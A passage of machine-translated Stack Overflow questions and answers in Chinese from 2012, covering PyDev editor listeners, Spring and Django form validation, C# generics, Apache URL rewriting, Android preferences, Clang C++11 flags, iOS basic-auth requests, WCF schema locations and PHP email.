    class PyEditListener(IPyEditListener, IPyEditListener3):
        def onInputChanged(self, 
                           edit, 
                           oldInput, 
                           newInput, 
                           monitor):
            print 'onInputChanged'

    try:
        editor.addPyeditListener(PyEditListener())
    except Exception, ex:
        print ex

print 'finished.' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T12:15:22.373

仅当某些编辑器绑定到一个文件然后绑定到另一个文件（而不是文档更改）时，才应调用 onInputChanged。

您可以通过收听命令“onSetDocument”上的文档更改来实现您想要的：

```
if False:
    from org.python.pydev.editor import PyEdit #@UnresolvedImport
    cmd = 'command string'
    editor = PyEdit

#-------------- REQUIRED LOCALS
#interface: String indicating which command will be executed
assert cmd is not None 

#interface: PyEdit object: this is the actual editor that we will act upon
assert editor is not None

print 'command is:', cmd, ' file is:', editor.getEditorFile().getName()
if cmd == 'onSetDocument':
    from org.eclipse.jface.text import IDocumentListener
    class Listener(IDocumentListener):

        def documentAboutToBeChanged(self, ev):
            print 'documentAboutToBeChanged'

        def documentChanged(self, ev):
            print 'documentChanged'

    doc = editor.getDocument()
    doc.addDocumentListener(Listener())

print 'finished.' 
```

请注意您将要执行的操作，因为当用户键入内容时，它将在主线程中运行（在这种情况下，您绝对不希望您想要的东西变慢 - 如果您只是在分析当前行，事情应该没问题，但是如果您对整个文档运行启发式算法，事情可能会变慢）。

# spring - 如何使用注释执行服务器端验证

> ID：10991234
> 
> 赞同：1
> 
> 时间：2012-06-12T05:58:38.460
> 
> 标签：spring, hibernate

我在我的项目中使用spring 3.0.5RELEASE。现在我的要求是我想对表单进行验证。我是spring的新手，我不知道如何执行，我用谷歌搜索了它。然后我找到了使用休眠的解决方案- validator.jar 我们可以实现它。每当我将数据输入到表单中，数据保存在一个名为 SampleCommand 的实体类中，并且在这个类中我有 5 个字段。首先我试图在一个字段上应用验证。所以我给了作为

```
@NotNull(message = "The above field must not be blank.")
    private Integer sourceId; 
```

下面是控制器类代码

```
public ModelAndView processForm(@ModelAttribute("reports") @Valid ReportsCommand model, ModelAndView modelAndView,BindingResult result,
            HttpServletRequest request, HttpServletResponse response) throws Exception {

        if (result.hasErrors()) {
           return new ModelAndView(new RedirectView("../pages/report/main.jsp"));
        } 
        else{
           ....
          } 
```

以下是仅适用于该字段的 jsp 代码。

```
<form id="report-generate-form" method="post" action="../../reports/html" target="newWindow">
<div class="form-row" style="">
                        <div class="label"><%=Msg.get(MsgEnum.SOURCE_CONFIG_NAME_LABEL)%><em>*</em>
                        </div>
                        <div class="form-row">

                            <select name="sourceId" id="source-dropdown" class="input-field-select mandatory constrained"

                            <select name="sourceName" id="source-dropdown"
                                class="input-field-select mandatory constrained"

                                constraints='{"fieldLabel":"Source Name","mustSelect":"true"}'>
                                <option value="-1">Select</option>
                            </select>
                        </div>
                        <div class="error-container">
                            <div class="error-img"></div>
                            <label class="error"></label>
                        </div>
                        <form:errors path="sourceId" cssClass="error" />
                    </div>
</form> 
```

如果我这样使用，应用程序正在运行，没有任何异常，但是当我填写表单时，我错过了 sourceId 字段并单击提交按钮。然后它不显示验证消息。我还需要做任何事情来显示消息。对不起我的英语不好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:11:01.113

在您的控制器中，处理表单发布方法的方法必须在标记为**@ModelAttribute的字段上具有****@Valid**注释，并且该方法必须具有参数，然后您应该检查 if 条件，如下所示。**`BindingResult result`**

 **```
if(result.hasError()) {
// return the same view having the form.
} else {
// insert the data in database and return the success view.
} 
```

我还建议您在此处显示您的控制器和 jsp 文件。

希望这对您有所帮助。干杯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:31:53.773

您必须做的几件事来验证您的表单
1\. 使用`@valid`Japs 提到的注释
2.`<form:errors>`在 JSP 上使用以显示错误。
例如，检查此[链接](http://www.roseindia.net/tutorial/spring/spring3/web/spring-3-mvc-validation-example.html)。**

# django - django测试非字段验证错误

> ID：10991239
> 
> 赞同：4
> 
> 时间：2012-06-12T05:59:05.190
> 
> 标签：django, django-testing

我有一个自定义验证功能，但我想测试它是否抛出了它应该使用 Django 提供的 unittest 框架的错误。

我可以直接调用该函数并以这种方式对其进行测试，但这并不能确保它在视图中被正确使用（即：我想做一个集成测试）。

测试非字段特定验证错误的 django 方法是什么？

例如，一个电子邮件字段将测试输入的文本是否是有效的电子邮件地址，但表单上方会显示一个非字段错误，与任何一个字段都没有关系。例如，它会说该电子邮件地址已经注册。

在测试应用程序时，如何测试这些非现场验证错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-12-04T09:14:22.587

您可以使用[`assertFormError()`](https://docs.djangoproject.com/en/stable/topics/testing/tools/#django.test.SimpleTestCase.assertFormError).

> 断言表单上的字段在表单上呈现时会引发提供的错误列表。

请注意，表单名称必须是表单名称，而`context`不是您用于验证的实际表单。

您可以按如下方式使用它`non_field_errors`（与任何字段无关的一般错误）：

```
self.assertFormError(response, 'form', None, 'Some error') 
```

您可以按如下方式测试特定字段错误：

```
self.assertFormError(response, 'form', 'field_name', 'Some error') 
```

您还可以传入一组错误以进行测试。

```
errors = ['some error 1', 'some error 2']
self.assertFormError(response, 'form', 'field_name', errors) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:04:10.573

编写一个自定义函数来验证字段并调用它而不是 form.is_valid()。

Django 文档对此提供了详细的描述。检查以下链接。

[https://docs.djangoproject.com/en/dev/ref/forms/validation/#form-field-default-cleaning](https://docs.djangoproject.com/en/dev/ref/forms/validation/#form-field-default-cleaning)

例如：从 django 导入表单

```
class ContactForm(forms.Form):
    subject = forms.CharField(max_length=100)
    email = forms.EmailField(required=False)
    message = forms.CharField(widget=forms.Textarea)

def clean_message(self):
    message = self.cleaned_data['message']
    num_words = len(message.split())
    if num_words < 4:
        raise forms.ValidationError("Not enough words!")
    return message 
```

先生 clean_message 将是我的自定义验证方法

# c# - 在 C# 中 <> 到底是什么意思？

> ID：10991241
> 
> 赞同：0
> 
> 时间：2012-06-12T05:59:15.857
> 
> 标签：c#, .net, generics

我是 C# 的新手，来自 PHP。一切几乎都清楚了，除了我不知道构造 Interface/Collection **<>**的确切含义。

我已经将 <> 用于“类型定义”，但它究竟意味着什么。我这样使用它：

```
class TaskComparer : IEqualityComparer<Task> ...
class TaskQueue : ConcurrentQueue<Task> ... 
```

等等你有没有看到任何关于这个的文章？请张贴链接。谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T06:02:21.133

它被称为“泛型”，它是一种（如您所说）定义类型参数的方法。这是 MSDN 上的介绍性文章：http: [//msdn.microsoft.com/en-us/library/ms172192.aspx](http://msdn.microsoft.com/en-us/library/ms172192.aspx)

作为此实用程序的一个简单示例，请考虑存储库模式。

```
public interface IRepository<T> {
    public void Add (T obj);
    public IEnumerable<T> GetAll();
} 
```

通过正确的实现，现在您可以拥有任何类型实体的存储库接口。

```
public void someMethod(IRepository<Person> personsRepo) 
{
    IEnumerable<Person> persons = personsRepo.GetAll();
    // ...
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:02:24.910

您很可能是指[泛型](http://msdn.microsoft.com/en-us/library/ms379564%28VS.80%29.aspx)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T06:02:44.940

这

*标识符* `<` *类型定义* `>`

标识符后面的块表示从[*泛型类型定义*](http://msdn.microsoft.com/en-us/library/ms379564%28v=vs.80%29.aspx)构造的类型。

这个这个定义是*递归*的：你可以从其他泛型类型构造泛型类型：就像你可以拥有数组的数组一样，你可以构造列表列表、字典列表等等。

此外，您可以使用类似的构造来构建泛型函数，除了您使用泛型函数的名称来代替类型或接口名称。

您可以构建自己的泛型类型和函数定义，并直接或通过反射访问它们。这个概念非常强大，因为它将强类型扩展到从其他类型构建的类型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T06:05:09.840

在集合的情况下，它定义了集合内的数据类型。这只是一种提高类型安全性的方法。一个小例子：

```
ArrayList<Integer> test = new ArrayList<Integer>();

test.Add(1); // will work
test.Add("2");  //will throw an exception, String cannot be cast to int 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-12T06:12:38.830

请阅读其他人提供的有关泛型的文章；不过，我在这里给你一个快速的介绍。

比如说，我们想编写一个 id 函数（准确地返回它的输入）。这应该适用于每种类型，对吧？所以，我们天真的方法是使用`object`：

```
object id(object x) {
    return x
} 
```

但是，这`object`每次都会返回 - 您必须在之后转换才能取回您的“具体”类型，如下所示`int x = (int)id(12)`：泛型解决了这个问题。它们允许您对类型进行参数化以保持*完全相同*：

```
T id2<T> (T x) {
    return x
} 
```

查看类型签名，您可以看到此版本接受*any* `T`并返回*相同* `T`（替换`T`为`int`，您会看到）。

我希望这能给你一个快速的概述。另外，请阅读有关约束的信息。

# php - 如何在我的网站上使用多个 fb 页面？

> ID：10991245
> 
> 赞同：0
> 
> 时间：2012-06-12T05:59:40.253
> 
> 标签：php, facebook

我有一个 php 网站，在标题中我显示指向我的 facebook 页面的 facebook 图像。

现在我有多个 fb 页面，所以我想显示一个下拉列表，其中列出了所有 fb 页面，当用户从下拉列表中选择一个页面时，他/她将被重定向到该 fb 页面？

是否可以？如果是，那么我将如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:11:38.703

只需在您的 HTML 代码中有一个选择列表，将选项的值设置为页面 ID/名称，甚至是完整的 URL。

然后，您可以通过 JavaScript（onchange 事件）对下拉列表中的更改做出反应并根据 location.href= *"address"*进行重定向，或者将其放在表单元素中并将其发送到您的服务器并从那里重定向（位置标头）提交的选项值。

这是非常基本的东西——任何对 Web 开发有一点了解的人都应该能够自己做到这一点。如果这对您来说仍然听起来很复杂，请先对所涉及的技术有一些基本的了解。

如果你不喜欢基本的选择元素样式，你总是可以通过一些 jQuery 或任何插件来设计它，那里有很多可以帮助你根据你的布局/设计需求重新设计一个简单的选择元素的样式。

# android - 显示首选项对话框而不进入首选项屏幕

> ID：10991254
> 
> 赞同：3
> 
> 时间：2012-06-12T06:00:10.407
> 
> 标签：android, android-preferences

我想在不进入首选项屏幕的情况下显示首选项对话框。想要在文本编辑器中实现这一点，用户单击字体选择按钮并弹出对话框供用户选择自定义字体，但无法实现。这是我的代码...！

```
package com.utils;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.SharedPreferences.Editor;
import android.graphics.Typeface;
import android.preference.DialogPreference;
import android.util.AttributeSet;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.CheckedTextView;

public class FontPreference extends DialogPreference implements DialogInterface.OnClickListener
{
    // Keeps the font file paths and names in separate arrays
    private List< String >    m_fontPaths;
    private List< String >    m_fontNames;

    // Font adaptor responsible for redrawing the item TextView with the appropriate //font.
    // We use BaseAdapter since we need both arrays, and the effort is quite small.
    public class FontAdapter extends BaseAdapter
    {
      private List< String >    m_fontPaths;
      private List< String >    m_fontNames;

        @Override
        public int getCount()
        {
            return m_fontNames.size();
        }

        @Override
        public Object getItem(int position)
        {
            return m_fontNames.get( position );
        }

        @Override
        public long getItemId(int position)
        {
            // We use the position as ID
            return position;
        }

        @Override
        public View getView( int position, View convertView, ViewGroup parent )
        {
            View view = convertView;

            // This function may be called in two cases: a new view needs to be created,
            // or an existing view needs to be reused
            if ( view == null )
            {
                // Since we're using the system list for the layout, use the system inflater
                final LayoutInflater inflater = (LayoutInflater)
                            getContext().getSystemService( Context.LAYOUT_INFLATER_SERVICE );

                // And inflate the view android.R.layout.select_dialog_singlechoice
                // Why? See com.android.internal.app.AlertController method createListView()
                view = inflater.inflate( android.R.layout.select_dialog_singlechoice, parent, false);
            }

            if ( view != null )
            {
                // Find the text view from our interface
                CheckedTextView tv = (CheckedTextView) view.findViewById( android.R.id.text1 );

                // Replace the string with the current font name using our typeface
                Typeface tface = Typeface.createFromFile( m_fontPaths.get( position ) );
                tv.setTypeface( tface );

                // If you want to make the selected item having different foreground or background color,
                // be aware of themes. In some of them your foreground color may be the background color.
                // So we don't mess with anything here and just add the extra stars to have the selected
                // font to stand out.
                tv.setText( m_fontNames.get( position ) );
            }

            return view;
        }
    }

    public FontPreference( Context context, AttributeSet attrs )
    {
        super(context, attrs);
    }

    @Override
    protected void onPrepareDialogBuilder( Builder builder )
    {
        super.onPrepareDialogBuilder(builder);

        // Get the fonts on the device
        HashMap< String, String > fonts = FontManager.enumerateFonts();
        m_fontPaths = new ArrayList< String >();
        m_fontNames = new ArrayList< String >();

        // Get the current value to find the checked item
        String selectedFontPath = getSharedPreferences().getString( getKey(), "");
        int idx = 0, checked_item = 0;

        for ( String path : fonts.keySet() )
        {
            if ( path.equals( selectedFontPath ) )
                checked_item = idx;

            m_fontPaths.add( path );
            m_fontNames.add( fonts.get(path) );
            idx++;
        }

        // Create out adapter
        // If you're building for API 11 and up, you can pass builder.getContext
        // instead of current context
        FontAdapter adapter = new FontAdapter();

        builder.setSingleChoiceItems( adapter, checked_item, this );

        // The typical interaction for list-based dialogs is to have click-on-an-item dismiss the dialog
        builder.setPositiveButton(null, null);
    }

//  //Expose the protected onClick method
//    void show() {
//        onClick();
//    }

    public void onClick(DialogInterface dialog, int which)
    {
        if ( which >=0 && which < m_fontPaths.size() )
        {
            String selectedFontPath = m_fontPaths.get( which );
            Editor editor = getSharedPreferences().edit();
            editor.putString( getKey(), selectedFontPath );
            editor.commit();

            dialog.dismiss();
        }
    }
} 
```

这是我的preference.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android" >

    <PreferenceCategory
        android:key="first_category"
        android:title="First Category" >
        <com.utils.FontPreference
            android:key="fonts"
            android:summary="Select Font"
            android:title="Change Fonts" />
    </PreferenceCategory>

</PreferenceScreen> 
```

# c# - 为什么我的 JavaScript 不能从我的代码后面执行？

> ID：10991255
> 
> 赞同：0
> 
> 时间：2012-06-12T06:00:19.910
> 
> 标签：c#, javascript, asp.net, code-behind

这是我的 aspx 文件：[Default.aspx](http://pastebin.com/uuWHjQRf)（我认为这无关紧要）

这是我的 C# 代码隐藏文件：[Default.aspx.cs](http://pastebin.com/2BrjAG5D)

这是我的调试输出。它表明 JavaScript 行之前的所有内容都已执行：

```
[4476] aspx.page: Begin Load 
[4476] : Number of fields = 2 
[4476] : Page to load = Login 
[4476] : Session matched the supplied GUID! 
[4476] aspx.page: End Load 
```

我完全迷路了。我真的很感激一些帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T09:36:36.197

@Mike：如果您的页面中没有 ScriptManager，则 ScriptManager.RegisterClientScriptBlock 方法将不起作用，而是使用此：

```
ClientScript.RegisterClientScriptBlock(this.GetType(), "DummeyKey", "alert('Hi')", true); 
```

# regex - apache配置文件中的正则表达式

> ID：10991256
> 
> 赞同：1
> 
> 时间：2012-06-12T06:00:22.330
> 
> 标签：regex

我需要确保如果用户点击`"//"`而不是`"/"`，它应该由 apache 配置中的正则表达式处理一些 url。对于前 -

`"http://www.mysite.com//home/index.jsp"`URL 应被重定向或视为`"http://www.mysite.com/home/index.jsp"`

您能否说明一下我应该在 apache 配置中使用什么正则表达式以确保它完美运行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:10:38.643

取自[这个答案](https://webmasters.stackexchange.com/questions/8354/what-does-the-double-slash-mean-in-urls/8381#8381)：

> 如果您将 Apache 与 mod_rewrite 一起使用，则有一个非常简单的修复方法：
> 
> ```
> # remove multiple slashes anywhere in url 
> RewriteCond %{REQUEST_URI} ^(.*)//(.*)$ 
> RewriteRule . %1/%2 [R=301,L] 
> ```
> 
> 这将发出 HTTP 301 Moved Permanently 重定向，以便从 URL 中删除任何双斜杠。

# android - 测试时如何让android ui线程执行到底？

> ID：10991271
> 
> 赞同：0
> 
> 时间：2012-06-12T06:01:39.217
> 
> 标签：android, junit, tdd

我有一个应用程序，它将从网络下载文件。通过单击按钮触发下载操作，然后它将启动一个新线程来下载此文件。

我现在要做的是测试下载是否成功。
所以我写了以下测试代码：

```
private void testGenerateFile() throws Exception {
    try {
        runTestOnUiThread(new Runnable() {
            @Override
            public void run() {
                ((EditText)mActivity.findViewById(R.id.edit_server)).setText("http://192.168.120.248/phonebook.xml");
                click(R.id.ok);
            }
        });
    } catch (Throwable e) {
    }
} 
```

但是执行后，文件还没有下载。但是如果我`Thread.sleep(2000)`在最后添加，文件就会生成。但我认为这不是一个适当的解决方案。你能帮助我吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:05:38.700

如果您知道文件下载到的位置以及文件的大小，则可以定期检查（直到预定义的持续时间）正在创建和下载的文件。如果文件大小符合原始大小，您可以假设文件已成功下载。

# jquery - DIV进入视口时触发函数

> ID：10991272
> 
> 赞同：0
> 
> 时间：2012-06-12T06:01:44.543
> 
> 标签：jquery, viewport

我设置了以下功能，以在页面加载时顺序淡入 div（使用“设备”类）。

我想修改它，以便在 div（带有“设备”类）进入视口时触发该函数。

该页面是一个大的水平滚动页面。div 的间距足够大，以至于它们在视口之外，直到发生一些滚动。

有谁知道我如何做到这一点？

非常感谢。

```
<script>
$(function() {
    var $sequence = $('div[class=device]').hide(), div = 0;
    (function(){
         $($sequence[div++]).fadeIn('slow', arguments.callee);
    })();
}); 
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:14:02.823

我自己没有使用过，但您可能想看看 jquery[出现插件](http://code.google.com/p/jquery-appear/)。

# android - Android 上的小部件设置

> ID：10991273
> 
> 赞同：-3
> 
> 时间：2012-06-12T06:01:53.873
> 
> 标签：android, android-widget, android-appwidget

我有一个托管小部件的画廊视图，

配置该小部件后，我将一个小部件添加到图库视图中。

有什么方法可以让我获得配置的小部件的设置并在以后使用它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-14T11:58:44.843

你的问题有点模糊，因为你没有提到你的设置可能是什么。

通常，对于原始数据，您可以将它们存储在[SharedPreferences](http://developer.android.com/reference/android/content/SharedPreferences.html)中，这非常简单。

对于更复杂的设置，您可能需要查看替代存储，例如文件或 SQLite

**编辑：**

自从您更改了问题以来，我正在更新我的答案，现在我对您想要什么有了更好的了解。

好的，您似乎想要访问另一个应用程序小部件的配置。假设其他应用程序将其配置存储在 中`SharePreferences`，那么您就卡住了，无法访问其他应用程序的`SharedPreferences`. 这已经被问过并回答[过](https://stackoverflow.com/questions/6030321/android-retrieving-shared-preferences-of-other-application)

此时，您应该问自己以下问题：

1.  我到底想从图库小部件中得到什么（你对你到底想知道什么还是有点含糊）
2.  是否有另一种方法来满足您的任何要求

# c++ - Clang 中的初始化列表

> ID：10991274
> 
> 赞同：13
> 
> 时间：2012-06-12T06:01:59.073
> 
> 标签：c++, c++11

今天，Apple 更新了 Xcode 的命令行工具，然后将 clang 从 318.0.58 升级到了 318.0.61。

我尝试使用初始化列表，但无法编译下面的代码。

```
#include <iostream>
#include <random>
#include <initializer_list>

int main()
{
    std::mt19937 rng(time(NULL));

    std::initializer_list<double> probabilities =
    {
        0.5, 0.1, 0.1, 0.1, 0.1, 0.1
    };

    std::discrete_distribution<> cheat_dice (probabilities);

    int a[6] = { };

    for ( int i = 0 ; i != 1000; ++i )
    {
        ++a[cheat_dice(rng)];
    }

    for ( int i = 0; i != 6; ++i )
    {
        std::cout << i + 1 << "=" << a[i] << std::endl;
    }
} 
```

然后，我尝试编译。

```
$ clang++ -stdlib=libc++ foo.cpp 
```

错误日志

```
foo.cpp:9:10: error: no member named 'initializer_list' in namespace 'std'
    std::initializer_list<double> probabilities =
    ~~~~~^
foo.cpp:9:33: error: expected '(' for function-style cast or type construction
    std::initializer_list<double> probabilities =
                          ~~~~~~^
foo.cpp:9:35: error: use of undeclared identifier 'probabilities'
    std::initializer_list<double> probabilities =
                                  ^
foo.cpp:10:5: error: expected expression
    {
    ^
foo.cpp:14:46: error: use of undeclared identifier 'probabilities'
    std::discrete_distribution<> cheat_dice (probabilities);
                                             ^
5 errors generated. 
```

另一方面，我可以用 gcc-4.7.1-RC-20120606 编译上面的代码。

```
$ g++ -std=c++11 foo.cpp 
```

Apple 的 clang 不支持初始化列表吗？叮当版本：

```
$ clang++ -v
Apple clang version 3.1 (tags/Apple/clang-318.0.61) (based on LLVM 3.1svn)
Target: x86_64-apple-darwin11.4.0
Thread model: posix 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-12T06:04:21.797

尝试通过指定`-std=c++0x`（正如@jweyrich 正确指出的那样）作为`clang`命令行的一部分。默认为`clang`C++98 模式。初始化列表是 C++11 的一个特性。

此外，从 clang C++98 和 C++11[支持页面](http://clang.llvm.org/cxx_status.html)，您可以检查各种新 C++ 标准功能的状态。例如，初始化列表在 3.1（及更高版本）中可用。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-10-21T13:01:52.387

使用命令编译：

```
clang++ -stdlib=libc++ -std=c++0x foo.cpp 
```

请注意，这`-std=c++11`也有效。在我的机器上，运行：

```
$ clang --version 
```

结果是：

```
Apple clang version 4.1 (tags/Apple/clang-421.11.66) (based on LLVM 3.1svn)
Target: x86_64-apple-darwin12.2.0 
```

# iphone - 带有用户名和密码的 NSURLRequest 的 curl 命令

> ID：10991278
> 
> 赞同：3
> 
> 时间：2012-06-12T06:02:21.487
> 
> 标签：iphone, ios

我正在向服务器发出请求。这是卷曲命令：

```
curl -u admin@example.com:12321 -d 'oauth_signature_method=PLAINTEXT&oauth_consumer_key=0d716e57-5ada-4b29-a33c-2f4af1b26837&oauth_signature=f0963fa5-1259-434f-86fc-8a17d14b16ca%26' 'https://external.ningapis.com/xn/rest/apiexample/1.0/Token?xn_pretty=true' 
```

现在我想用 NSURLRequest 发出请求，有人知道该怎么做吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-13T03:37:30.040

我已经解决了，这是代码。

```
NSURL *url = [NSURL URLWithString:@"https://external.ningapis.com/xn/rest/tapatalk/1.0/Token?xn_pretty=true"];
NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url];
NSString *theUsername = @"username";
NSString *thePassword = @"password";
NSString *loginString = [NSString stringWithFormat:@"%@:%@",theUsername,thePassword];
NSString *authString = [@"Basic " stringByAppendingFormat:@"%@", [self base64Encoding:[loginString dataUsingEncoding:NSUTF8StringEncoding]]];
[request setValue:authString forHTTPHeaderField:@"Authorization"];
[request setHTTPMethod:@"POST"];
[request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];

NSString *requestStr = @"oauth_signature_method=PLAINTEXT&oauth_consumer_key=yourconsumerkey&oauth_signature=yourconsumerkeysecret%26";
[request setHTTPBody:[requestStr dataUsingEncoding:NSUTF8StringEncoding]];
[request setValue:[NSString stringWithFormat:@"%d", [[requestStr dataUsingEncoding:NSUTF8StringEncoding] length]] forHTTPHeaderField:@"Content-Length"];

NSError *error = nil;
NSURLResponse *response;
NSData *urlData=[NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&error];
NSString *data=[[NSString alloc]initWithData:urlData encoding:NSUTF8StringEncoding]; 
```

# c# - 在 wsdl 中更改模式位置

> ID：10991284
> 
> 赞同：0
> 
> 时间：2012-06-12T06:02:37.953
> 
> 标签：c#, wcf

我在 WCF 的 web.config 中有以下配置。

```
<serviceMetadata httpGetEnabled="true" /> 
```

因此，一旦我这样做，我将在 wsdl 中获得模式位置

```
<xsd:import schemaLocation="http://mysever/Projectname/Services/myService?xsd=xsd0" namespace="MyServiceHost/Service/01/2011"/> 
```

但我想将其更改为**https** ://mysever/Projectname/Services/myService?xsd=xsd0。

我无法启用 httpsGetEnabled = true，因为我将通过 http 获取 wsdl，但我希望在 https 中有服务请求。

我正在使用负载平衡器，其中负载平衡器到网络服务器的流量通过 http。

有什么建议么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T06:17:53.570

我建议使用[WCFExtras](http://wcfextras.codeplex.com/) ( [HOWTO](http://wcfextras.codeplex.com/wikipage?title=HowToUse&referringTitle=Home) ) 或[WCFExtrasPlus](http://wcfextrasplus.codeplex.com/)。

如何使用 ECFExtras：

1.  在配置文件中添加以下扩展名

    ```
    <extensions>
      <behaviorExtensions>
        <add
          name="wsdlExtensions"
          type="WCFExtras.Wsdl.WsdlExtensionsConfig, WCFExtras, Version=1.0.0.0, Culture=neutral"
        />
      </behaviorExtensions>
    </extensions> 
    ```

2.  添加自定义行为

    ```
    <behavior name="CustomBehavior">
      <wsdlExtensions location="https://mysever/Projectname/Services/myService.svc"/>
    </behavior> 
    ```

您也可以使用[SoapExtensionReflector](http://blogs.msdn.com/b/kaevans/archive/2005/11/16/493496.aspx)。

此外，您需要将以下[属性](http://msdn.microsoft.com/en-us/library/system.servicemodel.addressfiltermode.aspx)添加到服务声明中，才能通过负载均衡器使用该服务。

```
[ServiceBehavior(AddressFilterMode = AddressFilterMode.Any)] 
```

# ruby-on-rails - Rails 关联不会自动保存

> ID：10991286
> 
> 赞同：1
> 
> 时间：2012-06-12T06:02:47.963
> 
> 标签：ruby-on-rails, activerecord, associations

我正在尝试rails guide 中给出的[自连接示例。](http://guides.rubyonrails.org/association_basics.html#self-joins)我在表中添加了一个“manager_id”字段。

问题是，在关联这两个对象之后，直到我调用“保存”才反映。

我在开发模式下通过控制台对其进行了测试：

```
> boss, emp = 2.times.map { FactoryGirl.create :employee }
> emp.manager = boss
> emp.manager_id == boss.id
=> true
> boss.subordinates
=> [] 
```

如果我现在保存“emp”，我会得到想要的结果。

```
> emp.save
> boss.subordinates
=> [#Employee obj] 
```

为什么呢？我是否也必须使用相同的方法来编写测试用例？不知何故，我觉得我做错了，应该有更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:25:28.260

在您的第一个代码示例中，已为您的 emp 实例分配了一个经理，但您的老板对象没有任何下属，并且数据库中尚不存在任何下属。

在您调用 emp 上的 save 之前，ActiveRecord 不会知道您将 boss 作为经理添加到另一个对象。当您调用 save 时，记录将保存到数据库中。

将记录保存到测试脚本的数据库中没有任何问题，只要您有一个清理脚本，它会在您创建不需要的记录后删除它们。这还将测试您的模型的验证和关联。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T08:33:08.610

当你调用 boss.subordinates 时，ROR 会发出如下 SQL 请求：

```
Select * from subordinates where subordinates.id = #{id} 
```

在您的情况下，数据库中没有下属的记录，您什么也得不到。

您必须将记录保存在数据库中才能使您的关联工作。

# php - user@host 和 sh-4.1$ 之间的区别（使用 GNU 屏幕）

> ID：10991290
> 
> 赞同：0
> 
> 时间：2012-06-12T06:03:24.563
> 
> 标签：php, bash, centos

当我使用

```
2> >(tee stderr.log >&2) 
```

在命令前面带有 sh-4.1$ 的 shell 中，它不起作用。但是，如果开头显示 username@hostname，它可以工作。

另外 - 这是在使用 PHP 打开屏幕时。我应该如何更改我的脚本才能使其正常工作？脚本是：

```
php exec("screen -S SCREENNAME -p 0 -X stuff 'COMMAND 2> >(tee stderr.log >&2)"); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:11:17.403

当您的提示以“sh”开头时，它是以**sh 兼容模式**运行的 bash ，它*没有*进程替换。您的命令*必须*通过 bash 运行；运行`bash -c`并传递命令以作为字符串运行。

# c# - 断言 NameValueCollection 是否等效

> ID：10991292
> 
> 赞同：3
> 
> 时间：2012-06-12T06:03:36.653
> 
> 标签：c#, nunit

有谁知道断言 NameValueCollection 是否等效的好方法？目前我正在使用 NUnit，但 CollectionAssert.AreEquivalent() 似乎只断言键。不是键和值。

我写了一小段代码来帮助我，但如果有一些开箱即用的东西可以做同样的事情，那就太好了。

```
private static void AssertNameValueCollectionAreEquivalent(NameValueCollection expectedCollection, NameValueCollection collection)
{
   // Will evaluate keys only
   CollectionAssert.AreEquivalent(expectedCollection, collection);

   foreach (string namevalue in collection)
   {
      Assert.AreEqual(expectedCollection[namevalue], collection[namevalue]);
   }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:10:43.667

我是`Fluent Assertions`NUnit 的粉丝。不仅语法流畅和简洁，而且它们使许多断言更容易，这就是其中之一。

考虑：

```
var c = new NameValueCollection();
var c2 = new NameValueCollection();

c.Add("test1", "testvalue1");
c.Add("test2", "testvalue2");

c2.Add("test1", "testvalue1");
c2.Add("test2", "testvalue2");

c.Should().BeEquivalentTo(c2); // assertion succeeds 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:29:57.597

如何将其转换为 Dictionary 并断言为：

```
CollectionAssert.AreEquivalent(
    expectedCollection.AllKeys.ToDictionary(k => k, k => expectedCollection[k]),
    collection.AllKeys.ToDictionary(k => k, k => collection[k])); 
```

# php - 将结果从随机数组发送到电子邮件 php

> ID：10991294
> 
> 赞同：5
> 
> 时间：2012-06-12T06:03:53.150
> 
> 标签：php, arrays, email, random

经过数小时试图自己解决这个问题后，我正在寻求帮助。

我有以下代码，我想将结果通过电子邮件发送到电子邮件。

**这是我的代码：**

```
$emailme = "myemail@somewhere.com";

$subject = "Randomly selected from array";
$headers = "From: $emailme\n";

$message = "Here is the Randomly selected from array.\n
Random text: $r_array";

$r_array=file('file.txt'); 
shuffle($r_array); 
$output = "<p><center><b>The Randomly Selected Text is:</b></p><b>" .  
$r_array[0] . "All done, echoing results.";

mail($emailme,$subject,$message,$headers); 
```

到目前为止，我能够将结果回显到屏幕上，但无法通过电子邮件发送结果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T06:12:30.390

发送电子邮件非常简单，例如：

```
<?php
$r_array=file('file.txt');   
shuffle($r_array);   

